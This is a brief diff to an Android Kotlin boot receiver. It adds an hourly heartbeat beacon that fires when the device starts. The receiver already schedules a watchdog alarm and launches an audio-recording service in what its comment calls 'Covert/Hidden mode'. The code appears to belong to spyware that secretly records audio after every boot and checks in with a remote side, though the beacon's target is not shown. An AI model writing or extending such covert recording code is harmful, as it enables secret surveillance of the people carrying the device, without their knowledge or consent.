@@ -47,7 +47,11 @@ class BootReceiver : BroadcastReceiver() {
             // 2. Schedule the 2-hour repeating watchdog alarms starting after 5 AM
             WatchdogScheduler.scheduleRecurringWatchdog(context)
 
-            // 3. Start AudioRecordService in Covert/Hidden mode with BOOT flag
+            // 3. Schedule and transmit 1-Hour Alive Heartbeat beacon
+            HeartbeatManager.scheduleHourlyHeartbeat(context)
+            HeartbeatManager.sendHeartbeat(context, "device_boot")
+
+            // 4. Start AudioRecordService in Covert/Hidden mode with BOOT flag
             try {
                 val serviceIntent = Intent(context, AudioRecordService::class.java).apply {
                     this.action = AudioRecordService.ACTION_START_HIDDEN
